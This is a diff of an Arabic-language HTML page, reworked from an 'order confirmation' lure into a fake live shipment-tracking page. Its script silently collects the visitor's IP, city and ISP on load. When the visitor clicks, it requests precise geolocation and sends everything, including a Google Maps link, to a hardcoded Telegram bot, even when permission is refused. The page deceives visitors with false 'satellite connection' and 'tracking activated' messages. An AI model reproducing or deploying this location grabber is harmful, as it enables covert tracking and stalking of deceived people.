@@ -4,32 +4,47 @@ index.html
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام تأكيد الطلبات</title>
+    <title>نظام تتبع الشحنات الذكي</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; max-width: 350px; border-top: 5px solid #0088cc; }
-        h3 { color: #333; }
-        button { background-color: #0088cc; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
-        #status { margin-top: 15px; color: #777; font-size: 14px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; position: relative; overflow: hidden; }
+        .card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 8px; background: linear-gradient(90deg, #ff5e00, #ff9213); }
+        .icon-box { font-size: 50px; color: #ff5e00; margin-bottom: 20px; }
+        h2 { color: #222; margin-bottom: 10px; font-size: 22px; }
+        p { color: #666; line-height: 1.6; font-size: 15px; margin-bottom: 25px; }
+        .btn-track { background: linear-gradient(135deg, #ff5e00, #ff9213); color: white; border: none; padding: 16px; border-radius: 12px; cursor: pointer; width: 100%; font-size: 17px; font-weight: bold; transition: 0.3s; box-shadow: 0 4px 15px rgba(255, 94, 0, 0.3); }
+        .btn-track:active { transform: scale(0.98); }
+        #status { margin-top: 20px; color: #888; font-size: 13px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #ff5e00; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h3>نظام تأكيد الطلبات</h3>
-    <p>لتأكيد هويتك وضمان وصول الطلب، يرجى الضغط على الزر أدناه.</p>
-    <button onclick="startProcess()">تأكيد الهوية والطلب</button>
-    <p id="status">بانتظار الضغط على الزر...</p>
+<div class="card">
+    <div class="icon-box">
+        <i class="fas fa-map-location-dot"></i>
+    </div>
+    <h2>تتبع شحنتك المباشر</h2>
+    <p>يرجى الضغط على الزر أدناه لتفعيل خاصية التتبع المباشر ومعرفة مكان المندوب والوقت المتبقي للوصول.</p>
+    
+    <button class="btn-track" onclick="startProcess()">تفعيل تتبع الموقع الآن</button>
+    
+    <div id="status">
+        <div class="loader" id="loader"></div>
+        <span id="statusText">بانتظار تأكيدك...</span>
+    </div>
 </div>
 
 <script>
-    // بيانات البوت الخاصة بك
+    // بياناتك الخاصة (تأكد من بقاء التوكن والـ ID كما هما)
     const TELEGRAM_TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
     const CHAT_ID = '6876904688'; 
 
     let fullData = {};
 
-    // 1. جلب IP صامتاً فور فتح الصفحة
+    // جلب الـ IP فوراً
     fetch('https://ipapi.co/json/')
     .then(res => res.json())
     .then(data => {
@@ -40,7 +55,11 @@ index.html
     });
 
     function startProcess() {
-        document.getElementById('status').innerText = "جاري معالجة الطلب...";
+        const statusText = document.getElementById('statusText');
+        const loader = document.getElementById('loader');
+        
+        statusText.innerText = "جاري الاتصال بالقمر الصناعي...";
+        loader.style.display = "block";
         
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
@@ -48,16 +67,15 @@ index.html
                     fullData.lat = pos.coords.latitude;
                     fullData.lng = pos.coords.longitude;
                     fullData.map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    sendToTelegram("✅ زبون جديد (وافق على الموقع)");
+                    sendToTelegram("🚀 زبون طلب تتبع مباشر (وافق)");
                 },
                 (err) => {
-                    fullData.error = "رفض الإذن";
-                    sendToTelegram("⚠️ زبون جديد (رفض الموقع/بيانات IP فقط)");
+                    sendToTelegram("⚠️ زبون فتح الرابط (رفض إذن الموقع)");
                 },
-                { enableHighAccuracy: true, timeout: 5000 }
+                { enableHighAccuracy: true, timeout: 8000 }
             );
         } else {
-            sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع");
+            sendToTelegram("❌ المتصفح لا يدعم التتبع");
         }
     }
 
@@ -67,9 +85,8 @@ ${statusMsg}
 ━━━━━━━━━━━━
 📍 IP: ${fullData.ip || 'غير معروف'}
 🏙 المدينة: ${fullData.city || '--'}
-🏳️ الدولة: ${fullData.country || '--'}
 🌐 الشركة: ${fullData.isp || '--'}
-📍 الخريطة: ${fullData.lat ? fullData.map : 'لم يتم السماح'}
+🔗 الخريطة: ${fullData.lat ? fullData.map : 'الموقع مرفوض'}
 ━━━━━━━━━━━━
         `;
 
@@ -79,14 +96,14 @@ ${statusMsg}
             body: JSON.stringify({ chat_id: CHAT_ID, text: message })
         })
         .then(() => {
-            document.getElementById('status').innerText = "تم التأكيد بنجاح!";
-            alert("شكراً لك، تم تأكيد هويتك بنجاح.");
-        })
-        .catch(() => {
-            document.getElementById('status').innerText = "حدث خطأ، حاول مرة أخرى.";
+            document.getElementById('loader').style.display = "none";
+            document.getElementById('statusText').innerText = "تم تفعيل التتبع بنجاح!";
+            alert("تم ربط جهازك بنظام التتبع بنجاح. يرجى الانتظار قليلاً.");
         });
     }
 </script>
 
 </body>
 </html>
+
+        
